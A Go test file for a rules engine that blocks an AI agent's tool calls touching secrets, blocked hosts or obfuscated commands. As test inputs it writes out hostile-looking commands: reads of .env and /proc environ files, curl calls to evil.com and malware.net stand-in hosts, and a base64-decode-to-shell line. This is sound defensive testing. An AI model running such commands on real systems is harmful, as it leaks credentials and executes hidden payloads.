package rules

import (
	"encoding/json"
	"regexp"
	"strings"
	"sync"
	"sync/atomic"
	"testing"
	"time"

	"github.com/gobwas/glob"
)

// Helper to create a ToolCall with JSON arguments
func makeToolCall(name string, args map[string]any) ToolCall {
	argsJSON, _ := json.Marshal(args)
	return ToolCall{
		Name:      name,
		Arguments: argsJSON,
	}
}

func TestEngine_BasicPathMatching(t *testing.T) {
	// Create a rule that blocks reading .env files
	rules := []Rule{
		{
			Name:    "block-env-files",
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"**/.env", "**/.env.*"},
			},
			Message:  "BLOCKED: Access to .env files is not allowed",
			Severity: SeverityCritical,
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: cat .env should be blocked
	call := makeToolCall("Bash", map[string]any{
		"command": "cat .env",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected cat .env to be blocked, but it wasn't")
	}
	if result.RuleName != "block-env-files" {
		t.Errorf("Expected rule name 'block-env-files', got '%s'", result.RuleName)
	}
	if result.Action != ActionBlock {
		t.Errorf("Expected action 'block', got '%s'", result.Action)
	}

	// Test: cat README.md should NOT be blocked
	call = makeToolCall("Bash", map[string]any{
		"command": "cat README.md",
	})
	result = engine.Evaluate(call)

	if result.Matched {
		t.Errorf("Expected cat README.md to be allowed, but it was blocked")
	}
}

func TestEngine_VariableExpansion(t *testing.T) {
	// Create a rule that blocks reading files in home directory secrets
	rules := []Rule{
		{
			Name:    "block-home-secrets",
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"/home/testuser/.env", "/home/testuser/.secrets/**"},
			},
			Message: "BLOCKED: Access to home directory secrets",
		},
	}

	// Create engine with a controlled normalizer
	normalizer := NewNormalizerWithEnv("/home/testuser", "/home/testuser/project", map[string]string{
		"HOME": "/home/testuser",
	})

	engine, err := NewTestEngineWithNormalizer(rules, normalizer)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: cat $HOME/.env should be blocked (variable expansion)
	call := makeToolCall("Bash", map[string]any{
		"command": "cat $HOME/.env",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected cat $HOME/.env to be blocked, but it wasn't")
	}

	// Test: cat ${HOME}/.env should also be blocked (braced variable)
	call = makeToolCall("Bash", map[string]any{
		"command": "cat ${HOME}/.env",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected cat ${HOME}/.env to be blocked, but it wasn't")
	}

	// Test: cat ~/.env should be blocked (tilde expansion)
	call = makeToolCall("Bash", map[string]any{
		"command": "cat ~/.env",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected cat ~/.env to be blocked, but it wasn't")
	}
}

func TestEngine_PathTraversal(t *testing.T) {
	// Create a rule that blocks reading .env in the user's home
	rules := []Rule{
		{
			Name:    "block-env-files",
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"/home/testuser/.env"},
			},
			Message: "BLOCKED: Access to .env files",
		},
	}

	// Create engine with a controlled normalizer
	normalizer := NewNormalizerWithEnv("/home/testuser", "/tmp", map[string]string{})

	engine, err := NewTestEngineWithNormalizer(rules, normalizer)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: path traversal attack should be normalized and blocked
	call := makeToolCall("Bash", map[string]any{
		"command": "cat /tmp/../home/testuser/.env",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected path traversal attack to be blocked, but it wasn't")
	}

	// Test: another path traversal variant
	call = makeToolCall("Bash", map[string]any{
		"command": "cat /var/log/../../home/testuser/.env",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected path traversal attack to be blocked, but it wasn't")
	}
}

func TestEngine_Exceptions(t *testing.T) {
	// Create a rule that blocks .env files but allows .env.example
	rules := []Rule{
		{
			Name:    "block-env-files",
			Actions: []Operation{OpRead},
			Block: Block{
				Paths:  []string{"**/.env", "**/.env.*"},
				Except: []string{"**/.env.example", "**/.env.sample"},
			},
			Message: "BLOCKED: Access to .env files",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: .env should be blocked
	call := makeToolCall("Bash", map[string]any{
		"command": "cat .env",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected .env to be blocked, but it wasn't")
	}

	// Test: .env.local should be blocked
	call = makeToolCall("Bash", map[string]any{
		"command": "cat .env.local",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected .env.local to be blocked, but it wasn't")
	}

	// Test: .env.example should be ALLOWED (exception)
	call = makeToolCall("Bash", map[string]any{
		"command": "cat .env.example",
	})
	result = engine.Evaluate(call)

	if result.Matched {
		t.Errorf("Expected .env.example to be allowed, but it was blocked")
	}

	// Test: .env.sample should be ALLOWED (exception)
	call = makeToolCall("Bash", map[string]any{
		"command": "cat .env.sample",
	})
	result = engine.Evaluate(call)

	if result.Matched {
		t.Errorf("Expected .env.sample to be allowed, but it was blocked")
	}
}

func TestEngine_NetworkHostMatching(t *testing.T) {
	// Create a rule that blocks network access to certain hosts
	rules := []Rule{
		{
			Name:    "block-malicious-hosts",
			Actions: []Operation{OpNetwork},
			Block: Block{
				Hosts: []string{"evil.com", "*.malware.net", "192.168.1.**"},
			},
			Message: "BLOCKED: Network access to blocked host",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: curl to evil.com should be blocked
	call := makeToolCall("Bash", map[string]any{
		"command": "curl https://evil.com/data",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected curl to evil.com to be blocked, but it wasn't")
	}

	// Test: curl to subdomain.malware.net should be blocked (wildcard)
	call = makeToolCall("Bash", map[string]any{
		"command": "curl http://subdomain.malware.net/payload",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected curl to subdomain.malware.net to be blocked, but it wasn't")
	}

	// Test: curl to safe.example.com should be ALLOWED
	call = makeToolCall("Bash", map[string]any{
		"command": "curl https://safe.example.com/api",
	})
	result = engine.Evaluate(call)

	if result.Matched {
		t.Errorf("Expected curl to safe.example.com to be allowed, but it was blocked")
	}
}

func TestEngine_DisabledRules(t *testing.T) {
	// Create a disabled rule
	enabled := true
	disabled := false
	rules := []Rule{
		{
			Name:    "enabled-rule",
			Enabled: &enabled,
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"**/enabled.txt"},
			},
			Message: "BLOCKED: enabled.txt",
		},
		{
			Name:    "disabled-rule",
			Enabled: &disabled,
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"**/disabled.txt"},
			},
			Message: "BLOCKED: disabled.txt",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Verify only enabled rule is loaded
	if len(engine.getCompiledRules()) != 1 {
		t.Fatalf("Expected 1 rule (disabled rule should be skipped), got %d", len(engine.getCompiledRules()))
	}

	// Test: enabled.txt should be blocked
	call := makeToolCall("Bash", map[string]any{
		"command": "cat enabled.txt",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected enabled.txt to be blocked, but it wasn't")
	}

	// Test: disabled.txt should NOT be blocked (rule is disabled)
	call = makeToolCall("Bash", map[string]any{
		"command": "cat disabled.txt",
	})
	result = engine.Evaluate(call)

	if result.Matched {
		t.Errorf("Expected disabled.txt to be allowed (rule disabled), but it was blocked")
	}
}

func TestEngine_MultipleActions(t *testing.T) {
	// Create a rule that blocks both read and write to sensitive paths
	rules := []Rule{
		{
			Name:    "protect-secrets",
			Actions: []Operation{OpRead, OpWrite, OpDelete},
			Block: Block{
				Paths: []string{"**/secrets/**", "**/.ssh/**"},
			},
			Message: "BLOCKED: Access to secrets directory",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: reading from secrets should be blocked
	call := makeToolCall("Bash", map[string]any{
		"command": "cat secrets/api_key.txt",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected reading secrets to be blocked, but it wasn't")
	}

	// Test: writing to secrets should be blocked
	call = makeToolCall("Bash", map[string]any{
		"command": "echo 'data' > secrets/data.txt",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected writing to secrets to be blocked, but it wasn't")
	}

	// Test: deleting from secrets should be blocked
	call = makeToolCall("Bash", map[string]any{
		"command": "rm secrets/old_key.txt",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected deleting from secrets to be blocked, but it wasn't")
	}
}

func TestEngine_ReadWriteTools(t *testing.T) {
	// Create a rule that blocks access to .env files
	rules := []Rule{
		{
			Name:    "block-env-files",
			Actions: []Operation{OpRead, OpWrite},
			Block: Block{
				Paths: []string{"**/.env", "**/.env.*"},
			},
			Message: "BLOCKED: Access to .env files",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test: Read tool should be blocked
	call := makeToolCall("Read", map[string]any{
		"file_path": "/home/user/project/.env",
	})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected Read tool to be blocked for .env, but it wasn't")
	}

	// Test: Write tool should be blocked
	call = makeToolCall("Write", map[string]any{
		"file_path": "/home/user/project/.env",
		"content":   "SECRET=value",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected Write tool to be blocked for .env, but it wasn't")
	}

	// Test: Edit tool should be blocked (it's a write operation)
	call = makeToolCall("Edit", map[string]any{
		"file_path":  "/home/user/project/.env.local",
		"old_string": "OLD",
		"new_string": "NEW",
	})
	result = engine.Evaluate(call)

	if !result.Matched {
		t.Errorf("Expected Edit tool to be blocked for .env.local, but it wasn't")
	}
}

func TestEngine_EvaluateJSON(t *testing.T) {
	rules := []Rule{
		{
			Name:    "block-env-files",
			Actions: []Operation{OpRead},
			Block: Block{
				Paths: []string{"**/.env"},
			},
			Message: "BLOCKED: Access to .env files",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	// Test EvaluateJSON convenience method
	result := engine.EvaluateJSON("Bash", `{"command": "cat .env"}`)

	if !result.Matched {
		t.Errorf("Expected EvaluateJSON to block cat .env, but it didn't")
	}
	if result.RuleName != "block-env-files" {
		t.Errorf("Expected rule name 'block-env-files', got '%s'", result.RuleName)
	}
}

func TestEngine_RegexPatternLengthLimit(t *testing.T) {
	longPattern := "re:" + strings.Repeat("a", 5000)

	testRules := []Rule{
		{
			Name:    "long-regex",
			Actions: []Operation{OpRead},
			Match:   &Match{Path: longPattern},
			Message: "blocked",
		},
	}

	// Pattern is now validated at compile time — engine creation must fail
	_, err := NewTestEngine(testRules)
	if err == nil {
		t.Fatal("Expected error for regex pattern exceeding length limit, got nil")
	}
	if !strings.Contains(err.Error(), "regex pattern too long") {
		t.Errorf("Expected 'regex pattern too long' error, got: %v", err)
	}
}

func TestEngine_RegexValid(t *testing.T) {
	testRules := []Rule{
		{
			Name:    "regex-rule",
			Actions: []Operation{OpRead},
			Match:   &Match{Path: `re:/proc/(\d+|self)/(environ|cmdline)`},
			Message: "blocked",
		},
	}

	engine, err := NewTestEngine(testRules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	call := makeToolCall("Read", map[string]any{
		"file_path": "/proc/1234/environ",
	})
	result := engine.Evaluate(call)
	if !result.Matched {
		t.Error("expected regex match for /proc/1234/environ")
	}
}

func TestEngine_RegexCompileError(t *testing.T) {
	testRules := []Rule{
		{
			Name:    "bad-regex",
			Actions: []Operation{OpRead},
			Match:   &Match{Path: `re:[invalid`},
			Message: "blocked",
		},
	}

	// Invalid regex is now caught at compile time — engine creation must fail
	_, err := NewTestEngine(testRules)
	if err == nil {
		t.Fatal("Expected error for invalid regex pattern, got nil")
	}
	if !strings.Contains(err.Error(), "match.path regex") {
		t.Errorf("Expected 'match.path regex' error, got: %v", err)
	}
}

func TestCompileRegex(t *testing.T) {
	tests := []struct {
		name    string
		pattern string
		wantErr bool
	}{
		{"valid short", `\d+`, false},
		{"valid complex", `^/proc/(\d+|self)/(environ|cmdline)$`, false},
		{"empty", "", false},
		{"too long", strings.Repeat("a", maxRegexLen+1), true},
		{"at limit", strings.Repeat("a", maxRegexLen), false},
		{"invalid syntax", `[unclosed`, true},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			_, err := compileRegex(tt.pattern)
			if (err != nil) != tt.wantErr {
				t.Errorf("compileRegex(%q) error = %v, wantErr %v", tt.pattern, err, tt.wantErr)
			}
		})
	}
}

func TestMatchAnyRegexGlob(t *testing.T) {
	re, _ := compileRegex(`^/etc/.*`)
	g, _ := glob.Compile("/home/**/.env", '/')

	tests := []struct {
		name    string
		items   []string
		re      *regexp.Regexp
		g       glob.Glob
		literal string
		want    bool
	}{
		{"regex match", []string{"/etc/passwd"}, re, nil, "", true},
		{"regex no match", []string{"/tmp/safe"}, re, nil, "", false},
		{"glob match", []string{"/home/user/.env"}, nil, g, "", true},
		{"glob no match", []string{"/tmp/.env"}, nil, g, "", false},
		{"literal match", []string{"example.com"}, nil, nil, "example.com", true},
		{"literal no match", []string{"other.com"}, nil, nil, "example.com", false},
		{"empty items", []string{}, re, nil, "", false},
		{"nil items", nil, re, nil, "", false},
		{"multiple items first match", []string{"/tmp/x", "/etc/shadow"}, re, nil, "", true},
		{"multiple items no match", []string{"/tmp/x", "/home/y"}, re, nil, "", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			got := matchAnyRegexGlob(tt.items, tt.re, tt.g, tt.literal)
			if got != tt.want {
				t.Errorf("matchAnyRegexGlob() = %v, want %v", got, tt.want)
			}
		})
	}
}

func TestCompilePattern(t *testing.T) {
	tests := []struct {
		name      string
		pattern   string
		sep       rune
		wantRegex bool
		wantGlob  bool
		wantErr   bool
	}{
		{"regex", "re:^/etc/.*", '/', true, false, false},
		{"glob", "/home/**/.env", '/', false, true, false},
		{"host glob", "*.example.com", '.', false, true, false},
		{"host regex", "re:^10\\..*", '.', true, false, false},
		{"invalid regex", "re:[unclosed", '/', false, false, true},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			re, g, err := compilePattern(tt.pattern, tt.sep)
			if (err != nil) != tt.wantErr {
				t.Errorf("error = %v, wantErr %v", err, tt.wantErr)
			}
			if (re != nil) != tt.wantRegex {
				t.Errorf("regex = %v, wantRegex %v", re != nil, tt.wantRegex)
			}
			if (g != nil) != tt.wantGlob {
				t.Errorf("glob = %v, wantGlob %v", g != nil, tt.wantGlob)
			}
		})
	}
}

func TestExtractRules(t *testing.T) {
	compiled := []compiledRule{
		{Rule: Rule{Name: "rule1"}},
		{Rule: Rule{Name: "rule2"}},
	}
	rules := extractRules(compiled)
	if len(rules) != 2 {
		t.Fatalf("got %d rules, want 2", len(rules))
	}
	if rules[0].Name != "rule1" || rules[1].Name != "rule2" {
		t.Errorf("got names %q %q, want rule1 rule2", rules[0].Name, rules[1].Name)
	}
}

func TestCompileMatchConditions(t *testing.T) {
	conditions := []Match{
		{Path: "/etc/**"},
		{Host: "re:^evil\\..*"},
	}
	compiled, err := compileMatchConditions(conditions, "test-rule", "all")
	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}
	if len(compiled) != 2 {
		t.Fatalf("got %d compiled, want 2", len(compiled))
	}
	if compiled[0].PathGlob == nil {
		t.Error("expected PathGlob for first condition")
	}
	if compiled[1].HostRegex == nil {
		t.Error("expected HostRegex for second condition")
	}

	// Test error propagation
	bad := []Match{{Path: "re:[invalid"}}
	_, err = compileMatchConditions(bad, "test-rule", "any")
	if err == nil {
		t.Error("expected error for invalid regex")
	}
	if !strings.Contains(err.Error(), "any[0]") {
		t.Errorf("error should contain index: %v", err)
	}
}

func TestGetCompiledRules_DefensiveCopy(t *testing.T) {
	testRules := []Rule{
		{
			Name:    "test-rule",
			Actions: []Operation{OpRead},
			Block:   Block{Paths: []string{"/secret/**"}},
			Message: "blocked",
		},
	}
	engine, err := NewTestEngine(testRules)
	if err != nil {
		t.Fatal(err)
	}

	// Get a copy and modify it
	rules1 := engine.getCompiledRules()
	if len(rules1) != 1 {
		t.Fatalf("expected 1 rule, got %d", len(rules1))
	}
	rules1[0].Rule.Name = "MUTATED"

	// Second call should still return the original
	rules2 := engine.getCompiledRules()
	if rules2[0].Rule.Name != "test-rule" {
		t.Errorf("getCompiledRules returned mutated data: got %q, want %q", rules2[0].Rule.Name, "test-rule")
	}
}

// --- Phase method unit tests ---

// newMinimalEngine creates an engine with no rules for phase testing.
func newMinimalEngine(t *testing.T) *Engine {
	t.Helper()
	e, err := NewTestEngine(nil)
	if err != nil {
		t.Fatal(err)
	}
	return e
}

// TestValidateContent_NullBytesBlocked verifies step 5 blocks null bytes in write content.
func TestValidateContent_NullBytesBlocked(t *testing.T) {
	e := newMinimalEngine(t)
	info := ExtractedInfo{
		Operation: OpWrite,
		Content:   "hello\x00world",
	}
	m := e.validateContent(&info)
	if m == nil {
		t.Fatal("expected block for null byte in write content, got nil")
		return
	}
	if m.RuleName != "builtin:block-null-byte-write" {
		t.Errorf("expected rule builtin:block-null-byte-write, got %s", m.RuleName)
	}
}

// TestValidateContent_CleanWrite verifies normal writes pass.
func TestValidateContent_CleanWrite(t *testing.T) {
	e := newMinimalEngine(t)
	info := ExtractedInfo{
		Operation: OpWrite,
		Content:   "hello world",
	}
	m := e.validateContent(&info)
	if m != nil {
		t.Errorf("expected nil for clean write, got rule=%s", m.RuleName)
	}
}

// TestValidateContent_ObfuscationBlocked verifies step 7 detects base64 obfuscation.
func TestValidateContent_ObfuscationBlocked(t *testing.T) {
	e := newMinimalEngine(t)
	info := ExtractedInfo{
		Command: "echo cGF5bG9hZA== | base64 -d | sh",
	}
	m := e.validateContent(&info)
	if m == nil {
		t.Fatal("expected block for obfuscation, got nil")
		return
	}
	if m.RuleName != "builtin:block-obfuscation" {
		t.Errorf("expected rule builtin:block-obfuscation, got %s", m.RuleName)
	}
}

// TestValidateContent_EvasiveBlocked verifies step 6 blocks evasive commands.
func TestValidateContent_EvasiveBlocked(t *testing.T) {
	e := newMinimalEngine(t)
	info := ExtractedInfo{
		Evasive:       true,
		EvasiveReason: "fork bomb detected",
	}
	m := e.validateContent(&info)
	if m == nil {
		t.Fatal("expected block for evasive command, got nil")
		return
	}
	if m.RuleName != "builtin:block-shell-evasion" {
		t.Errorf("expected rule builtin:block-shell-evasion, got %s", m.RuleName)
	}
}

// TestValidateContent_DLPBlocked verifies step 8 detects API keys.
func TestValidateContent_DLPBlocked(t *testing.T) {
	e := newMinimalEngine(t)
	// AWS access key: AKIA + 16 alphanumeric chars (20 total)
	info := ExtractedInfo{
		RawJSON: `{"key":"AKIAIOSFODNN7EXAMPLE"}`,
	}
	m := e.validateContent(&info)
	if m == nil {
		t.Fatal("expected block for AWS key, got nil")
		return
	}
	if !strings.Contains(m.RuleName, "aws") {
		t.Errorf("expected AWS DLP rule, got %s", m.RuleName)
	}
}

// TestValidateContent_NormalCommand verifies clean commands pass all checks.
func TestValidateContent_NormalCommand(t *testing.T) {
	e := newMinimalEngine(t)
	info := ExtractedInfo{
		Command: "ls /tmp",
	}
	m := e.validateContent(&info)
	if m != nil {
		t.Errorf("expected nil for clean command, got rule=%s", m.RuleName)
	}
}

// TestValidateContent_NormalizesUnicode verifies step 4 normalizes before later checks.
func TestValidateContent_NormalizesUnicode(t *testing.T) {
	e := newMinimalEngine(t)
	info := ExtractedInfo{
		Command: "ls /tmp",
	}
	e.validateContent(&info)
	// After validateContent, Command should be NFKC-normalized
	if strings.ContainsRune(info.Command, 0x200B) {
		t.Error("expected zero-width space to be stripped")
	}
}

// TestResolvePaths_ProcBlocked verifies step 11 blocks /proc access.
func TestResolvePaths_ProcBlocked(t *testing.T) {
	e := newMinimalEngine(t)
	_, m := e.resolvePaths([]string{"/proc/1/environ"})
	if m == nil {
		t.Fatal("expected block for /proc access, got nil")
		return
	}
	if m.RuleName != "builtin:protect-proc" {
		t.Errorf("expected rule builtin:protect-proc, got %s", m.RuleName)
	}
}

// TestResolvePaths_CleanPath verifies normal paths pass.
func TestResolvePaths_CleanPath(t *testing.T) {
	e := newMinimalEngine(t)
	paths, m := e.resolvePaths([]string{"/tmp/foo"})
	if m != nil {
		t.Errorf("expected nil for clean path, got rule=%s", m.RuleName)
	}
	if len(paths) == 0 {
		t.Error("expected non-empty paths")
	}
}

// TestResolvePaths_FiltersShellGlobs verifies step 9 filters bare globs.
func TestResolvePaths_FiltersShellGlobs(t *testing.T) {
	e := newMinimalEngine(t)
	paths, m := e.resolvePaths([]string{"*", "/tmp/foo"})
	if m != nil {
		t.Errorf("expected nil, got rule=%s", m.RuleName)
	}
	// Bare "*" should be filtered out, only /tmp/foo remains
	found := false
	for _, p := range paths {
		if strings.Contains(p, "tmp/foo") {
			found = true
		}
	}
	if !found {
		t.Errorf("expected /tmp/foo in paths, got %v", paths)
	}
}

// TestMatchRules_PathRuleBlocks verifies step 12 matches path rules.
func TestMatchRules_PathRuleBlocks(t *testing.T) {
	e, err := NewTestEngine([]Rule{
		{
			Name:    "block-env",
			Actions: []Operation{OpRead},
			Block:   Block{Paths: []string{"**/.env"}},
			Message: "blocked",
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	info := ExtractedInfo{
		Operation: OpRead,
	}
	result := e.matchRules(&info, []string{"/home/user/.env"}, "Bash")
	if !result.Matched {
		t.Error("expected path rule to match")
	}
	if result.RuleName != "block-env" {
		t.Errorf("expected rule block-env, got %s", result.RuleName)
	}
}

// TestMatchRules_ContentOnlyFallback verifies step 13 matches content-only rules.
func TestMatchRules_ContentOnlyFallback(t *testing.T) {
	e, err := NewTestEngine([]Rule{
		{
			Name: "block-domain",
			Match: &Match{
				Content: "evil.example.com",
			},
			Message: "blocked domain",
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	info := ExtractedInfo{
		RawJSON: `{"url":"https://evil.example.com/payload"}`,
	}
	result := e.matchRules(&info, nil, "HttpRequest")
	if !result.Matched {
		t.Error("expected content-only rule to match")
	}
	if result.RuleName != "block-domain" {
		t.Errorf("expected rule block-domain, got %s", result.RuleName)
	}
}

// TestMatchRules_NoMatch verifies allowed calls return Matched=false.
func TestMatchRules_NoMatch(t *testing.T) {
	e, err := NewTestEngine([]Rule{
		{
			Name:    "block-env",
			Actions: []Operation{OpRead},
			Block:   Block{Paths: []string{"**/.env"}},
			Message: "blocked",
		},
	})
	if err != nil {
		t.Fatal(err)
	}
	info := ExtractedInfo{
		Operation: OpRead,
	}
	result := e.matchRules(&info, []string{"/tmp/safe.txt"}, "Bash")
	if result.Matched {
		t.Errorf("expected no match, got rule=%s", result.RuleName)
	}
}

// TestEngine_DeterministicRuleOrder verifies that when multiple rules share
// the same priority, the engine always picks the same winner (sorted by name).
func TestEngine_DeterministicRuleOrder(t *testing.T) {
	// All rules have the same default priority (50) but different names.
	// The engine sorts by priority then by name, so "aaa-block" should always win.
	rules := []Rule{
		{
			Name:    "ccc-block",
			Actions: []Operation{OpRead},
			Block:   Block{Paths: []string{"**/.secret"}},
			Message: "blocked by ccc",
		},
		{
			Name:    "aaa-block",
			Actions: []Operation{OpRead},
			Block:   Block{Paths: []string{"**/.secret"}},
			Message: "blocked by aaa",
		},
		{
			Name:    "bbb-block",
			Actions: []Operation{OpRead},
			Block:   Block{Paths: []string{"**/.secret"}},
			Message: "blocked by bbb",
		},
	}

	engine, err := NewTestEngine(rules)
	if err != nil {
		t.Fatalf("Failed to create engine: %v", err)
	}

	call := makeToolCall("Bash", map[string]any{
		"command": "cat .secret",
	})

	// Run Evaluate multiple times and verify the same rule always wins.
	for i := range 20 {
		result := engine.Evaluate(call)
		if !result.Matched {
			t.Fatalf("iteration %d: expected match, got none", i)
		}
		if result.RuleName != "aaa-block" {
			t.Fatalf("iteration %d: expected rule 'aaa-block', got '%s'", i, result.RuleName)
		}
	}
}

// --- PostChecker tests ---

// TestEngine_PostChecker_CalledAfterAllow verifies PostChecker is called when rules allow.
func TestEngine_PostChecker_CalledAfterAllow(t *testing.T) {
	engine, err := NewTestEngine([]Rule{
		{
			Name:    "block-env",
			Actions: []Operation{OpRead},
			Block:   Block{Paths: []string{"**/.env"}},
			Message: "blocked",
		},
	})
	if err != nil {
		t.Fatal(err)
	}

	called := false
	engine.SetPostChecker(func(call ToolCall, info ExtractedInfo) *MatchResult {
		called = true
		return nil // allow
	})

	// This call is NOT blocked by rules, so PostChecker should fire.
	call := makeToolCall("Bash", map[string]any{"command": "cat README.md"})
	result := engine.Evaluate(call)

	if result.Matched {
		t.Error("expected call to be allowed")
	}
	if !called {
		t.Error("expected PostChecker to be called when rules allow")
	}
}

// TestEngine_PostChecker_SkippedOnBlock verifies PostChecker is NOT called when rules block.
func TestEngine_PostChecker_SkippedOnBlock(t *testing.T) {
	engine, err := NewTestEngine([]Rule{
		{
			Name:    "block-env",
			Actions: []Operation{OpRead},
			Block:   Block{Paths: []string{"**/.env"}},
			Message: "blocked",
		},
	})
	if err != nil {
		t.Fatal(err)
	}

	called := false
	engine.SetPostChecker(func(call ToolCall, info ExtractedInfo) *MatchResult {
		called = true
		return nil
	})

	// This call IS blocked by rules, so PostChecker should NOT fire.
	call := makeToolCall("Bash", map[string]any{"command": "cat .env"})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Error("expected call to be blocked by rule")
	}
	if called {
		t.Error("PostChecker should NOT be called when rules already blocked the call")
	}
}

// TestEngine_PostChecker_CanBlock verifies PostChecker can convert allow to block.
func TestEngine_PostChecker_CanBlock(t *testing.T) {
	engine, err := NewTestEngine(nil) // no rules
	if err != nil {
		t.Fatal(err)
	}

	engine.SetPostChecker(func(call ToolCall, info ExtractedInfo) *MatchResult {
		m := NewMatch("plugin:sandbox", SeverityHigh, ActionBlock, "sandbox denied")
		return &m
	})

	call := makeToolCall("Bash", map[string]any{"command": "ls /tmp"})
	result := engine.Evaluate(call)

	if !result.Matched {
		t.Fatal("expected PostChecker to block the call")
	}
	if result.RuleName != "plugin:sandbox" {
		t.Errorf("expected rule 'plugin:sandbox', got %q", result.RuleName)
	}
	if result.Action != ActionBlock {
		t.Errorf("expected action block, got %q", result.Action)
	}
	if result.Message != "sandbox denied" {
		t.Errorf("expected message 'sandbox denied', got %q", result.Message)
	}
}

// TestEngine_PostChecker_ConcurrentRace verifies that concurrent Evaluate and
// SetPostChecker calls do not race. This test is meaningful under -race.
func TestEngine_PostChecker_ConcurrentRace(t *testing.T) {
	engine, err := NewTestEngine(nil)
	if err != nil {
		t.Fatal(err)
	}

	var wg sync.WaitGroup
	const goroutines = 16
	const iterations = 200

	// Spawn goroutines that call Evaluate concurrently.
	for range goroutines / 2 {
		wg.Go(func() {
			call := makeToolCall("Bash", map[string]any{"command": "ls /tmp"})
			for range iterations {
				engine.Evaluate(call)
			}
		})
	}

	// Spawn goroutines that call SetPostChecker concurrently.
	for i := range goroutines / 2 {
		wg.Go(func() {
			for j := range iterations {
				if (i+j)%2 == 0 {
					engine.SetPostChecker(func(call ToolCall, info ExtractedInfo) *MatchResult {
						return nil
					})
				} else {
					engine.SetPostChecker(nil)
				}
			}
		})
	}

	wg.Wait()
}

// TestEngine_NotifyReload_PanicRecovery verifies that a panicking reload
// callback does not crash the engine and other callbacks still fire.
func TestEngine_NotifyReload_PanicRecovery(t *testing.T) {
	engine, err := NewTestEngine(nil)
	if err != nil {
		t.Fatal(err)
	}

	var called atomic.Bool

	// Register a callback that panics.
	engine.OnReload(func(_ []Rule) {
		panic("intentional test panic")
	})

	// Register a callback after the panicking one.
	engine.OnReload(func(_ []Rule) {
		called.Store(true)
	})

	// Trigger reload — should not crash.
	engine.notifyReload()

	// Give goroutines time to execute.
	deadline := time.Now().Add(2 * time.Second)
	for time.Now().Before(deadline) {
		if called.Load() {
			return // success
		}
		time.Sleep(10 * time.Millisecond)
	}

	if !called.Load() {
		t.Error("second reload callback was never called; panic in first callback may have blocked it")
	}
}
